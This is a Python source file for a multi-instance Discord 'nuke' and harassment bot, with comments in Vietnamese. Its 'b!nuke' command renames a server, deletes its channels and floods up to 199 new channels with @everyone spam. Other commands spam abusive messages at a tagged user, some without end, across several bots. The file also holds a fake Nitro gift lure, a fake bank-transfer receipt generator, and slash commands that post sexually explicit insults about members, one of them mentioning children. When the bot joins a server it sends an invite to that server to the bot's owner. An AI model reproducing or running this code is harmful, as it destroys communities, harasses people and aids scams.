import asyncio
import itertools
import json
import math
import os
import random
import re
import discord
from discord import ButtonStyle, app_commands
from discord.ext import commands, tasks
from discord.ui import Button, Modal, TextInput, View

TERMUX_HOME_DIR = "/data/data/com.termux/files/home"
if os.path.exists(TERMUX_HOME_DIR):
  os.chdir(TERMUX_HOME_DIR)

ACCESS_FILE = "access_control.json"
USERS_TRACK_FILE = "used_users.json"


def track_user_usage(user_id):
  try:
    users = []
    if os.path.exists(USERS_TRACK_FILE):
      with open(USERS_TRACK_FILE, "r", encoding="utf-8") as f:
        users = json.load(f)
    if str(user_id) not in [str(x) for x in users]:
      users.append(user_id)
      with open(USERS_TRACK_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=4)
  except Exception:
    pass


def get_total_users_count():
  try:
    if os.path.exists(USERS_TRACK_FILE):
      with open(USERS_TRACK_FILE, "r", encoding="utf-8") as f:
        users = json.load(f)
        return len(users)
  except Exception:
    pass
  return 0


ADMIN_USER_ID = 1431804929508642947


def check_owner(user_id):
  try:
    return int(user_id) == int(ADMIN_USER_ID)
  except Exception:
    return user_id == ADMIN_USER_ID or str(user_id) == str(ADMIN_USER_ID)


def check_admin(member):
  if check_owner(member.id):
    return True
  if hasattr(member, "guild_permissions") and member.guild_permissions.administrator:
    return True
  return False



# ---------------------------------------------------------------------------
# Lightweight RAM caches
# ---------------------------------------------------------------------------
# These caches avoid disk reads on every Discord message/command. The JSON
# files remain the persistent source of truth and are written only when data
# actually changes.
_access_cache = None
_users_cache = None
_cache_lock = asyncio.Lock()
_file_cache = {}
_file_cache_mtime = {}


def _ensure_access_cache():
  global _access_cache
  if _access_cache is not None:
    return _access_cache

  default_data = {"blacklist": []}
  try:
    if os.path.exists(ACCESS_FILE):
      with open(ACCESS_FILE, "r", encoding="utf-8") as f:
        raw_data = json.load(f)
      if isinstance(raw_data, dict):
        blacklist = raw_data.get("blacklist", [])
      else:
        blacklist = []
    else:
      blacklist = []
  except (OSError, json.JSONDecodeError):
    blacklist = []

  if not isinstance(blacklist, list):
    blacklist = []

  _access_cache = {"blacklist": blacklist}

  # Rewrite old files so only blacklist data is kept.
  save_access_control(_access_cache)
  return _access_cache


def load_access_control():
  # Return the shared in-memory object. Existing command code can keep using
  # the same function without causing repeated disk I/O.
  return _ensure_access_cache()


def save_access_control(data):
  global _access_cache
  _access_cache = data

  # Atomic replacement prevents a partial JSON file if the process is
  # interrupted while writing.
  tmp_file = f"{ACCESS_FILE}.tmp"
  try:
    with open(tmp_file, "w", encoding="utf-8") as f:
      json.dump(data, f, ensure_ascii=False, indent=2)
      f.flush()
      os.fsync(f.fileno())
    os.replace(tmp_file, ACCESS_FILE)
  except OSError as e:
    print(f"Lỗi lưu access_control: {e}")
    try:
      if os.path.exists(tmp_file):
        os.remove(tmp_file)
    except OSError:
      pass


def _ensure_users_cache():
  global _users_cache
  if _users_cache is not None:
    return _users_cache

  users = set()
  try:
    if os.path.exists(USERS_TRACK_FILE):
      with open(USERS_TRACK_FILE, "r", encoding="utf-8") as f:
        raw_users = json.load(f)
      if isinstance(raw_users, list):
        users = {int(x) for x in raw_users if str(x).isdigit()}
  except (OSError, json.JSONDecodeError, TypeError, ValueError):
    users = set()

  _users_cache = users
  return _users_cache


def _persist_users_cache():
  users = _ensure_users_cache()
  tmp_file = f"{USERS_TRACK_FILE}.tmp"
  try:
    with open(tmp_file, "w", encoding="utf-8") as f:
      json.dump(sorted(users), f, ensure_ascii=False, indent=2)
      f.flush()
      os.fsync(f.fileno())
    os.replace(tmp_file, USERS_TRACK_FILE)
  except OSError as e:
    print(f"Lỗi lưu used_users: {e}")
    try:
      if os.path.exists(tmp_file):
        os.remove(tmp_file)
    except OSError:
      pass


def track_user_usage(user_id):
  try:
    users = _ensure_users_cache()
    uid = int(user_id)
    if uid not in users:
      users.add(uid)
      _persist_users_cache()
  except (TypeError, ValueError):
    pass


def get_total_users_count():
  return len(_ensure_users_cache())


ADMIN_USER_ID = 1431804929508642947


def check_owner(user_id):
  try:
    return int(user_id) == int(ADMIN_USER_ID)
  except (TypeError, ValueError):
    return str(user_id) == str(ADMIN_USER_ID)


def check_admin(member):
  if check_owner(member.id):
    return True
  return bool(
      hasattr(member, "guild_permissions")
      and member.guild_permissions.administrator
  )


def check_blacklist(user_id):
  data = _ensure_access_cache()
  uid = str(user_id)
  return any(str(x) == uid for x in data.get("blacklist", []))
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot1 = commands.Bot(command_prefix="b!", intents=intents)
bot2 = commands.Bot(command_prefix="b!", intents=intents)
bot3 = commands.Bot(command_prefix="b!", intents=intents)
bot4 = commands.Bot(command_prefix="b!", intents=intents)
bot5 = commands.Bot(command_prefix="b!", intents=intents)

spam_tasks = {}
guild_treo_tasks = {}


def _track_task(registry, guild_id, task):
  """Register a task and automatically remove it when it finishes."""
  tasks_for_guild = registry.setdefault(guild_id, [])
  tasks_for_guild.append(task)

  def _cleanup(done_task):
    current = registry.get(guild_id)
    if current is None:
      return
    try:
      current.remove(done_task)
    except ValueError:
      pass
    if not current:
      registry.pop(guild_id, None)

  task.add_done_callback(_cleanup)


def _collect_guild_tasks(guild_id):
  tasks_for_guild = []
  seen = set()
  for registry in (spam_tasks, guild_treo_tasks):
    for task in list(registry.get(guild_id, [])):
      if task not in seen and not task.done():
        seen.add(task)
        tasks_for_guild.append(task)
  return tasks_for_guild


async def _cancel_guild_tasks(guild_id):
  """Cancel every tracked task for one guild and wait for cancellation to settle."""
  tasks_for_guild = _collect_guild_tasks(guild_id)
  for task in tasks_for_guild:
    task.cancel()

  if tasks_for_guild:
    await asyncio.gather(*tasks_for_guild, return_exceptions=True)

  spam_tasks.pop(guild_id, None)
  guild_treo_tasks.pop(guild_id, None)
  return len(tasks_for_guild)

status_cycle = itertools.cycle([
    discord.Game(name="/menu | EPR ONTOP"),
    discord.CustomActivity(name="/menu | Emperor"),
    discord.Game(name="/menu | Emperor Ontop"),
])


@tasks.loop(seconds=300)
async def change_status():
  next_status = next(status_cycle)
  try:
    for b in [bot1, bot2, bot3, bot4, bot5]:
      if b.is_ready():
        await b.change_presence(status=discord.Status.dnd, activity=next_status)
  except Exception as e:
    print(f"Lỗi đổi status: {e}")


@change_status.before_loop
async def before_change_status():
  await bot1.wait_until_ready()


async def raw_send_message(bot_inst, channel_id, content):
  # Use discord.py's normal Channel.send() path so built-in rate-limit
  # handling is respected. If Discord still returns 429, obey retry_after.
  channel = bot_inst.get_channel(channel_id)
  if channel is None:
    try:
      channel = await bot_inst.fetch_channel(channel_id)
    except (discord.NotFound, discord.Forbidden, discord.HTTPException,
            asyncio.TimeoutError, OSError):
      return False

  for attempt in range(3):
    try:
      await channel.send(content)
      return True
    except asyncio.CancelledError:
      raise
    except discord.HTTPException as e:
      if e.status == 429:
        try:
          retry_after = max(0.1, float(getattr(e, "retry_after", 1.0)))
        except (TypeError, ValueError):
          retry_after = 1.0
        if attempt < 2:
          await asyncio.sleep(retry_after)
          continue
      elif attempt < 2:
        await asyncio.sleep(1)
    except (discord.NotFound, discord.Forbidden):
      return False
    except (asyncio.TimeoutError, OSError):
      if attempt < 2:
        await asyncio.sleep(1)
    except Exception:
      if attempt < 2:
        await asyncio.sleep(1)
  return False
def setup_bot_events(b_inst, name):

  @b_inst.event
  async def on_ready():
    print(f"✅ {name} chính thức đã online dưới tên: {b_inst.user}")
    try:
      synced = await b_inst.tree.sync()
      print(f"✅ Đã đồng bộ {len(synced)} lệnh Slash cho {name}!")
    except Exception as e:
      print(f"❌ Lỗi đồng bộ lệnh {name}: {e}")

    if not change_status.is_running():
      change_status.start()

  @b_inst.event
  async def on_guild_join(guild):
    try:
      if ADMIN_USER_ID == 0 or b_inst != bot1:
        return

      async def notify_owner():
        owner = b_inst.get_user(ADMIN_USER_ID) or await b_inst.fetch_user(
            ADMIN_USER_ID
        )
        if not owner:
          return

        adder_user = None
        adder = "Không rõ (Thiếu quyền Audit Log)"
        try:
          async for entry in guild.audit_logs(
              action=discord.AuditLogAction.bot_add, limit=1
          ):
            if entry.target.id == b_inst.user.id:
              adder_user = entry.user
              adder = f"{adder_user.mention}\nID: `{adder_user.id}`"
              break
        except Exception:
          pass

        invite_link = "Không tạo được link mời"
        for channel in guild.text_channels:
          if channel.permissions_for(guild.me).create_instant_invite:
            invite = await channel.create_invite(max_age=3600, max_uses=1)
            invite_link = invite.url
            break

        embed = discord.Embed(
            title=f"🚨 Bot {b_inst.user.name} Vừa Được Đưa Vào Server Mới!",
            color=discord.Color.orange(),
        )
        embed.add_field(
            name="🏷️ Tên server",
            value=f"`{guild.name}` (ID: `{guild.id}`)",
            inline=False,
        )
        embed.add_field(
            name="👥 Thành viên", value=str(guild.member_count), inline=True
        )
        embed.add_field(name="👤 Người add", value=adder, inline=True)
        embed.add_field(name="🔗 Link mời", value=invite_link, inline=False)

        if adder_user:
          embed.set_thumbnail(url=adder_user.display_avatar.url)

        await owner.send(embed=embed)

      asyncio.create_task(notify_owner())
    except Exception as e:
      print(f"Lỗi gửi thông báo add server: {e}")

  @b_inst.event
  async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.application_command:
      if check_blacklist(interaction.user.id):
        return
      track_user_usage(interaction.user.id)

  @b_inst.event
  async def on_message(message: discord.Message):
    if message.author.bot:
      return

    if check_blacklist(message.author.id):
      return

    track_user_usage(message.author.id)
    content_lower = message.content.lower()
    words = content_lower.split()

    if content_lower.startswith("b!nuke"):
      if not check_admin(message.author):
        return

      await message.channel.send(
          "Emperor OnTop 😜"
      )
      guild = message.guild

      try:
        if ADMIN_USER_ID != 0:
          owner = bot1.get_user(ADMIN_USER_ID) or await bot1.fetch_user(
              ADMIN_USER_ID
          )
          if owner:
            embed_nuke = discord.Embed(
                title=f"⚠️ [{b_inst.user.name}] Nuke Đã Được Kích Hoạt",
                color=discord.Color.red(),
            )
            embed_nuke.add_field(
                name="👤 User",
                value=f"{message.author.mention}\nID: `{message.author.id}`",
                inline=False,
            )
            embed_nuke.add_field(
                name="🏠 Server bị Nuke",
                value=f"`{guild.name}` (ID: `{guild.id}`)",
                inline=False,
            )
            embed_nuke.set_thumbnail(url=message.author.display_avatar.url)
            await owner.send(embed=embed_nuke)
      except Exception as e:
        print(f"Lỗi thông báo nuke: {e}")

      try:
        img_path = os.path.join(os.getcwd(), "picture", "girlchina.jpg")
        if not os.path.exists(img_path):
          img_path = "girlchina.jpg"

        edit_kwargs = {"name": "EMPEROR ONTOP $"}
        if os.path.exists(img_path):
          with open(img_path, "rb") as f:
            edit_kwargs["icon"] = f.read()

        await guild.edit(**edit_kwargs)
      except Exception as e:
        print(f"❌ Lỗi khi đổi tên/avatar server: {e}")

      guild_id = guild.id
      if guild_id not in spam_tasks:
        spam_tasks[guild_id] = []

      async def run_nuke():
        try:
          channel_names = [
              "N҉u҉k҉e҉ B҉y҉ B҉e҉c҉u҉s҉",
              "N̷u҉k҉e҉ B̷y҉ B̷e҉c҉u҉s҉",
              "ℕ𝕦𝕜𝕖 𝔹𝕪 𝔹𝕖𝕔𝕦𝕤",
              "𝔑𝔲𝔨𝔢 𝔅𝔶 𝔅𝔢𝔠𝔲𝔰",
          ]
          noi_dung_nuke = """@everyone @here
# [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
# SERVER DESTROYED BY BECUS BA KHI 🤣😂🤪😜
# [BECUS ONTOP](https://cutes.lol/emiuanh209)"""

          delete_tasks = [
              ch.delete()
              for ch in guild.channels
              if ch.id != message.channel.id
          ]
          if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

          nuke_semaphore = asyncio.Semaphore(30)

          async def create_and_spam():
            async with nuke_semaphore:
              name = random.choice(channel_names)
              try:
                ch = await guild.create_text_channel(name=name)
                if ch:
                  for i in range(10):
                    await raw_send_message(b_inst, ch.id, f"{noi_dung_nuke}\n")
                    await asyncio.sleep(1)
              except Exception:
                pass

          nuke_tasks = [create_and_spam() for _ in range(199)]
          if nuke_tasks:
            await asyncio.gather(*nuke_tasks, return_exceptions=True)
        except asyncio.CancelledError:
          pass
        except Exception as e:
          print(f"❌ Lỗi tiến trình: {e}")

      task = asyncio.create_task(run_nuke())
      spam_tasks[guild_id].append(task)
      await b_inst.process_commands(message)
      return
    # --- 2. LỆNH XANGON (V1, V2, V3) ---
    if (
        content_lower.startswith("b!xangonv3")
        or content_lower.startswith("b!xangonv2")
        or content_lower.startswith("b!xangon")
    ):
      if not check_admin(message.author):
        return

      target = None
      if message.mentions:
        target = message.mentions[0]
      elif len(words) > 1:
        arg = words[1]
        match = re.search(r'\d+', arg)
        if match:
          uid = int(match.group())
          target = message.guild.get_member(uid)
          if not target:
            try:
              target = await message.guild.fetch_user(uid)
            except Exception:
              pass

      if not target:
        if content_lower.startswith("b!xangonv3"):
          prefix_used = "b!xangonV3"
        elif content_lower.startswith("b!xangonv2"):
          prefix_used = "b!xangonV2"
        else:
          prefix_used = "b!xangon"
        await message.channel.send(
            f"❌ {message.author.mention} Vui lòng tag hoặc nhập ID người cần war! Ví dụ: `{prefix_used} @User` hoặc `{prefix_used} ID`"
        )
        return

      if content_lower.startswith("b!xangonv3"):
        cmd_name = "b!xangonV3"
        file_path = os.path.join(os.getcwd(), "BECUSwarFilengonV3.txt")
        is_infinite = True
      elif content_lower.startswith("b!xangonv2"):
        cmd_name = "b!xangonV2"
        file_path = os.path.join(os.getcwd(), "BECUSwarFilengonV2.txt")
        is_infinite = False
      else:
        cmd_name = "b!xangon"
        file_path = os.path.join(os.getcwd(), "BECUSwarFilengon.txt")
        is_infinite = False

      so_luong = 1
      if not is_infinite:
        for part in reversed(words[1:]):
          if part.isdigit():
            so_luong = int(part)
            break
        if so_luong > 999:
          so_luong = 999
        await message.channel.send(
            f"⚔️ Bắt đầu xả {so_luong} lượt tin nhắn tới {target.mention} bằng lệnh {cmd_name}!"
        )
      else:
        await message.channel.send(
            f"⚔️ Bắt đầu xả ngôn vĩnh viễn tới {target.mention} bằng lệnh {cmd_name}! Dùng `b!stop` hoặc `/stop` để dừng."
        )

      guild_id = message.guild.id
      cau_texts = []
      if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
          cau_texts = [line.strip() for line in f if line.strip()]
      if not cau_texts:
        cau_texts = ["Becus On Top"]

      async def spam_worker():
        if is_infinite:
          while True:
            try:
              cau_txt = random.choice(cau_texts)
              noi_dung = f"> # {cau_txt} {target.mention}"
              await raw_send_message(b_inst, message.channel.id, noi_dung)
              await asyncio.sleep(1)
            except asyncio.CancelledError:
              break
            except Exception:
              await asyncio.sleep(1)
        else:
          try:
            for i in range(so_luong):
              try:
                cau_txt = random.choice(cau_texts)
                noi_dung = f"> # {cau_txt} {target.mention}"
                await raw_send_message(b_inst, message.channel.id, noi_dung)
                await asyncio.sleep(1)
              except Exception:
                await asyncio.sleep(1)
          except asyncio.CancelledError:
            pass
          except Exception:
            pass

      task = asyncio.create_task(spam_worker())
      _track_task(spam_tasks, guild_id, task)

      await b_inst.process_commands(message)
      return

    # --- 3. LỆNH NOIDUNG ---
    if content_lower.startswith("b!noidung"):
      if not check_admin(message.author):
        return

      parts = message.content.split()
      if len(parts) < 2:
        await message.channel.send(
            f"❌ {message.author.mention} Vui lòng nhập nội dung! Ví dụ: `b!noidung đụ má mày 10`"
        )
        return

      so_luong = 1
      if len(parts) > 2 and parts[-1].isdigit():
        so_luong = int(parts[-1])
        spam_content = " ".join(parts[1:-1])
      else:
        spam_content = " ".join(parts[1:])

      if so_luong > 999:
        so_luong = 999

      if not spam_content:
        spam_content = "Emperor"

      guild_id = message.guild.id

      async def noidung_worker():
        try:
          for i in range(so_luong):
            try:
              await raw_send_message(b_inst, message.channel.id, spam_content)
              await asyncio.sleep(1)
            except Exception:
              await asyncio.sleep(1)
        except asyncio.CancelledError:
          pass
        except Exception:
          pass

      task = asyncio.create_task(noidung_worker())
      _track_task(spam_tasks, guild_id, task)

      await b_inst.process_commands(message)
      return

    # --- 4. LỆNH STOP ---
    if content_lower.startswith("b!stop"):
      if not check_admin(message.author):
        return

      guild_id = message.guild.id
      stopped_count = await _cancel_guild_tasks(guild_id)

      if stopped_count > 0:
        await message.channel.send(
            "🛑 **Đã dừng tất cả các tiến trình spam trong server này**"
        )
      else:
        await message.channel.send(
            "⚠️ Đéo có tiến trình nào đang chạy trong server này."
        )
      return

    # No automatic responses to ordinary chat messages.
    await b_inst.process_commands(message)


class FakeNitroView(View):

  def __init__(self):
    super().__init__(timeout=None)

  @discord.ui.button(
      label="Open Gift",
      style=ButtonStyle.primary,
      custom_id="fake_nitro_button",
  )
  async def nitro_callback(
      self, interaction: discord.Interaction, button: Button
  ):
    await interaction.response.send_message(
        f"# {interaction.user.mention} THG NGU BỊ LỪA VÌ NITRO 😂👈"
    )
class TreoChannelSelectView(discord.ui.View):

  def __init__(self, bot_instance):
    super().__init__(timeout=300)
    self.bot_instance = bot_instance
    self.selected_channels = []
    self.selected_user = None

    self.channel_select = discord.ui.ChannelSelect(
        placeholder="Chọn các kênh để treo spam...",
        channel_types=[discord.ChannelType.text],
        min_values=1,
        max_values=5,
        custom_id="treo_channel_select",
    )
    self.channel_select.callback = self.channel_callback
    self.add_item(self.channel_select)

    self.user_select = discord.ui.UserSelect(
        placeholder="Chọn user cần tag chửi...",
        min_values=1,
        max_values=1,
        custom_id="treo_user_select",
    )
    self.user_select.callback = self.user_callback
    self.add_item(self.user_select)

  async def channel_callback(self, interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    values = interaction.data.get("values", [])
    if values:
      self.selected_channels = [int(v) for v in values]
    else:
      self.selected_channels = [ch.id for ch in self.channel_select.values]

    msg = f"✅ Đã chọn {len(self.selected_channels)} kênh."
    await interaction.followup.send(msg, ephemeral=True)

  async def user_callback(self, interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    values = interaction.data.get("values", [])
    if values:
      uid = int(values[0])
      try:
        self.selected_user = interaction.guild.get_member(uid) or await interaction.guild.fetch_user(uid)
      except Exception:
        self.selected_user = None
    else:
      if self.user_select.values:
        self.selected_user = self.user_select.values[0]

    msg = f"✅ Đã chọn user: {self.selected_user.mention if self.selected_user else 'Không rõ'}"
    await interaction.followup.send(msg, ephemeral=True)
  @discord.ui.button(label="Start", style=ButtonStyle.green, custom_id="treo_start_btn")
  async def start_button(self, interaction: discord.Interaction, button: Button):
    await interaction.response.defer(ephemeral=True)
    if not check_admin(interaction.user):
      return

    channel_ids = self.selected_channels
    if not channel_ids:
      channel_ids = [ch.id for ch in interaction.guild.text_channels]

    guild_id = interaction.guild.id
    if guild_id not in guild_treo_tasks:
      guild_treo_tasks[guild_id] = []

    files = [
        "BECUSwarFilengon.txt",
        "BECUSwarFilengonV2.txt",
        "BECUSwarFilengonV3.txt",
    ]
    # Load text files through the RAM cache; refresh automatically when a file changes.
    def _load_cached_text_file(fname):
      mtime = os.path.getmtime(fname) if os.path.exists(fname) else 0
      if fname in _file_cache and _file_cache_mtime.get(fname) == mtime:
        return _file_cache[fname]
      lines = []
      if os.path.exists(fname):
        try:
          with open(fname, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        except Exception:
          pass
      if not lines:
        lines = ["Becus On Top"]
      _file_cache[fname] = lines
      _file_cache_mtime[fname] = mtime
      return lines

    file_contents = [_load_cached_text_file(fname) for fname in files]

    target = self.selected_user

    all_bots = [bot1, bot2, bot3, bot4, bot5]
    active_bots = [b for b in all_bots if b.get_guild(guild_id) is not None]

    if not active_bots:
      await interaction.followup.send("❌ Không có con bot nào trong hệ thống đang ở trong server này!", ephemeral=True)
      return

    async def treo_worker(bot_inst):
      async def spam_channel(ch_id):
        file_cycle = itertools.cycle([0, 1, 2])
        while True:
          f_idx = next(file_cycle)
          lines = file_contents[f_idx]
          text = random.choice(lines)
          try:
            if target:
              noi_dung = f"> # {text} {target.mention}"
            else:
              noi_dung = f"> # {text}"
            await raw_send_message(bot_inst, ch_id, noi_dung)
            await asyncio.sleep(1)
          except Exception:
            await asyncio.sleep(1)

      channel_tasks = [spam_channel(ch_id) for ch_id in channel_ids]
      try:
        await asyncio.gather(*channel_tasks)
      except asyncio.CancelledError:
        pass

    for b_inst in active_bots:
      task = asyncio.create_task(treo_worker(b_inst))
      _track_task(guild_treo_tasks, guild_id, task)

    await interaction.followup.send(
        f"⚔️ **Bắt đầu treo song song trên {len(channel_ids)} kênh với {len(active_bots)} con bot!**",
        ephemeral=True,
    )

  @discord.ui.button(label="Stop", style=ButtonStyle.red, custom_id="treo_stop_btn")
  async def stop_button(self, interaction: discord.Interaction, button: Button):
    if not check_admin(interaction.user):
      await interaction.response.defer(ephemeral=True)
      return

    guild_id = interaction.guild.id
    stopped_count = await _cancel_guild_tasks(guild_id)

    if stopped_count > 0:
      await interaction.followup.send(
          "🛑 **Đã dừng tất cả các tiến trình treo/spam trong server này!**",
          ephemeral=True,
      )
    else:
      await interaction.followup.send(
          "⚠️ Không có tiến trình nào đang chạy trong server này.",
          ephemeral=True,
      )


def register_all_commands(b_target):

  @b_target.tree.command(
      name="femboy", description="Cổ máy phân tích & đo độ Femboy"
  )
  @app_commands.describe(member="Chọn thằng ngu cần đo")
  async def femboy_slash(
      interaction: discord.Interaction, member: discord.Member = None
  ):
    await interaction.response.defer(ephemeral=False)
    target = member or interaction.user
    tyle = random.randint(1, 100)

    if tyle <= 25:
      level = "Thằng Lồn Này Trai Thẳng 😜"
      outfit = "Mặc Vest Đeo Đính Đen Siêu Cấp Bá Khí"
      nhan_xet = "Trai Thẳng 100%, Femboy Cái Lồn Má Mày"
    elif tyle <= 50:
      level = "Nghi Vấn Thằng Lồn Này Sắp Thành Femboy 🤔"
      outfit = "Hay Trộm Váy Của Mẹ Mặc Lén"
      nhan_xet = "Sắp Thành Femboy Rồi, Tập Gym Đi Thằng Lồn"
    elif tyle <= 80:
      level = "Thằng Chó Này Chuẩn Femboy 😂"
      outfit = "Mặc Toàn Đồ Con Gái, Tất Đen Cosplay Siêu Nứng"
      nhan_xet = "Chuẩn Mẹ Nó Femboy Rồi Khỏi Chối Đâu Thằng Lồn 🤣"
    else:
      level = "CHÚA TỂ FEMBOY TỐI THƯỢNG 🤤"
      outfit = "Cân All Outfit"
      nhan_xet = "Giọng Nói Ngọt Vãi Lồn Khiến Ae Bắn Tinh Như Mưa"

    embed = discord.Embed(
        title="🎀 MÁY ĐO FEMBOY BÁ KHÍ 🎀",
        description=(
            f"🎯 **Phân tích thằng ngu:** {target.mention}\n\n# 🌸 **{tyle}% FEMBOY** 🌸"
        ),
        color=discord.Color.from_rgb(255, 105, 180),
    )
    embed.add_field(name="🥶 Cấp Độ:", value=f"`{level}`", inline=True)
    embed.add_field(name="👗 Outfit:", value=f"`{outfit}`", inline=True)
    embed.add_field(
        name="💬 Phân Tích:", value=f"> *{nhan_xet}*", inline=False
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    embed.set_footer(
        text=f"Kiểm tra bởi {interaction.user.name} • EPR"
    )
    await interaction.followup.send(embed=embed)

  @b_target.tree.command(
      name="dam", description="Cổ máy phân tích & đo độ dâm của user"
  )
  @app_commands.describe(member="Chọn thằng ngu cần đo độ dâm")
  async def dam_slash(
      interaction: discord.Interaction, member: discord.Member = None
  ):
    await interaction.response.defer(ephemeral=False)
    target = member or interaction.user

    random.seed(target.id)
    score = random.randint(1, 100)
    random.seed()

    if score <= 20:
      level = "Trong Sáng Như Tờ Giấy Trắng 🧐"
      habit = "Đéo Dâm "
      nhan_xet = "Đéo Biết Đụ Là Gì"
    elif score <= 45:
      level = "Hơi Dâm 🤔"
      habit = "Có Lúc Suy Nghĩ Đến Việc Đụ Crush"
      nhan_xet = "Có Biểu Hiện Nhưng Còn Kiềm Chế Được"
    elif score <= 70:
      level = "Dâm Cấp Trung 😂"
      habit = "Hay Dụ Các Cô Gái Để Đụ Lén"
      nhan_xet = "Con Sói Thức Dậy Gặp Gái Là Cặc Cửng"
    elif score <= 90:
      level = "Thằng Chó Này Dâm  Vãi Lồn 🔥"
      habit = "Gặp Ai Cũng Đụ Bất Cứ Người Già Hay Trẻ Em"
      nhan_xet = "Tuy Đụ Rất Nhiều Nhưng Bị Yếu Sinh Lý"
    else:
      level = "CHÚA TỂ DÂM ĐÃNG 👑"
      habit = "Đụ Người Lẫn Động Vật Gia Súc Và Gia Cầm"
      nhan_xet = "Vì Đụ Quá Nhiều Nên Con Cặc Bị Hoại Tử Đành Phải Cắt Bỏ"

    embed = discord.Embed(
        title="🔥 MÁY ĐO DÂM ĐÃNG BÁ KHÍ 🔥",
        description=(
            f"🎯 **Phân tích thằng ngu:** {target.mention}\n\n"
            f"# 🍑 **{score}% DÂM ĐÃNG** 🍑"
        ),
        color=discord.Color.from_rgb(255, 105, 180),
    )
    embed.add_field(name="🥵 Cấp Độ:", value=f"`{level}`", inline=True)
    embed.add_field(name="🔥 Biểu Hiện:", value=f"`{habit}`", inline=True)
    embed.add_field(
        name="💬 Phân Tích:", value=f"> *{nhan_xet}*", inline=False
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    embed.set_footer(text=f"Kiểm tra bởi {interaction.user.name} • EPR")
    await interaction.followup.send(embed=embed)

  @b_target.tree.command(
      name="cute", description="Cổ máy phân tích & đo độ Cute"
  )
  @app_commands.describe(member="Chọn thằng ngu cần đo độ Cute")
  async def cute_slash(
      interaction: discord.Interaction, member: discord.Member = None
  ):
    await interaction.response.defer(ephemeral=False)
    target = member or interaction.user
    tyle = random.randint(1, 100)

    if tyle <= 20:
      level = "Người Bình Thường 🚶"
      style = "Hơi Hơi Cute"
      nhan_xet = "Có Một Chút Sự Đáng Yêu"
    elif tyle <= 50:
      level = "Hơi Cute 🌷"
      style = "Dễ Thương Vừa Đủ"
      nhan_xet = "Nhìn Vào Là Cửng Cặc"
    elif tyle <= 80:
      level = "Quá Cute 🥰"
      style = "Quá Là Đáng Yêu"
      nhan_xet = "Đáng Yêu Từ Mặt Đến Lỗ Đít"
    elif tyle <= 95:
      level = "Cực Kỳ Cute 💖"
      style = "Cute Vãi Lồn Luôn"
      nhan_xet = "Nhìn Vào Chỉ Muốn Đụ Rên~ Siêu Nứng Và Dễ Thương"
    else:
      level = "CHÚA TỂ CUTE 👑✨"
      style = "Cute Không Ai Bằng"
      nhan_xet = "Siêu Cấp Đáng Yêu Nhất Thế Giới"

    embed = discord.Embed(
        title="🌸 MÁY ĐO CUTE BÁ KHÍ 🌸",
        description=(
            f"🎯 **Phân tích:** {target.mention}\n\n"
            f"# 💖 **{tyle}% CUTE** 💖"
        ),
        color=discord.Color.from_rgb(255, 105, 180),
    )
    embed.add_field(name="🏷️ Cấp Độ:", value=f"`{level}`", inline=True)
    embed.add_field(name="✨ Phong Cách:", value=f"`{style}`", inline=True)
    embed.add_field(
        name="💬 Nhận Xét:", value=f"> *{nhan_xet}*", inline=False
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    embed.set_footer(text=f"Kiểm tra bởi {interaction.user.name} • EPR")
    await interaction.followup.send(embed=embed)
  @b_target.tree.command(
      name="chuyentien",
      description="Giả lập chuyển khoản ngân hàng",
  )
  @app_commands.describe(
      member="Người nhận tiền",
      sotien="Số tiền muốn chuyển",
      noidung="Nội dung chuyển khoản",
  )
  async def chuyentien_slash(
      interaction: discord.Interaction,
      member: discord.Member,
      sotien: str,
      noidung: str = "Chuyển tiền trả nợ",
  ):
    await interaction.response.defer(ephemeral=False)
    trans_id = f"FT{random.randint(100000000, 999999999)}"

    embed = discord.Embed(
        title="✅ GIAO DỊCH CHUYỂN KHOẢN THÀNH CÔNG",
        description="```prolog\n[VCB-Digibank] Biên lai chuyển tiền điện tử\n```",
        color=discord.Color.from_rgb(0, 204, 102),
    )
    embed.add_field(
        name="📤 Người chuyển:", value=f"{interaction.user.mention}", inline=True
    )
    embed.add_field(
        name="📥 Người nhận:", value=f"{member.mention}", inline=True
    )
    embed.add_field(name="💰 Số tiền:", value=f"{sotien} VNĐ", inline=False)
    embed.add_field(name="📝 Nội dung:", value=f"{noidung}", inline=False)
    embed.add_field(name="🆔 Mã giao dịch:", value=f"{trans_id}", inline=True)
    embed.add_field(name="⏰ Thời gian:", value="Hôm nay", inline=True)
    embed.set_footer(
        text=f"Thực hiện bởi {interaction.user.name} • Ngân Hàng Mại Dâm"
    )

    await interaction.followup.send(embed=embed)

  @b_target.tree.command(
      name="wibu", description="Phân Tích Độ Nghiện Anime Của Thằng Ngu Lồn"
  )
  @app_commands.describe(member="Chọn Thằng Ngu Để Kiểm Tra")
  async def wibu_slash(
      interaction: discord.Interaction, member: discord.Member = None
  ):
    await interaction.response.defer(ephemeral=False)
    target = member or interaction.user
    tyle = random.randint(1, 100)

    if tyle <= 20:
      status = "Thằng Lồn Này Bình Thường 🚶"
      waifu = "Đéo Có (Chỉ Thích Người Thật)"
      anime_hours = "0 Giờ / Tuần"
      quote = "Anime Là Con Cặc Gì?"
    elif tyle <= 50:
      status = "Wibu Sơ Cấp 🍡"
      waifu = "Rem / Nezuko / Hinata"
      anime_hours = "2 Giờ / Ngày"
      quote = "Ước Được Bóp Vú Và Xoa Ti Gái Alime 🤤"
    elif tyle <= 80:
      status = "Wibu Trung Cấp ⚔️"
      waifu = "1000 Em Waifu"
      anime_hours = "6 Giờ / Ngày"
      quote = "Ước Được Húp Nước Lồn Mấy Em Gái Alime Thì Sướng Biết Bao 🥺"
    else:
      status = "CHÚA TỂ WIBU / BÁ KHÍ OTAKU 👑🌀"
      waifu = "Tất cả Waifu trong mọi Anime Isekai"
      anime_hours = "24/7 (Không ngủ, chỉ cày Anime)"
      quote = "Ước Được Xe Tải Đâm Để Chuyển Sinh"

    embed = discord.Embed(
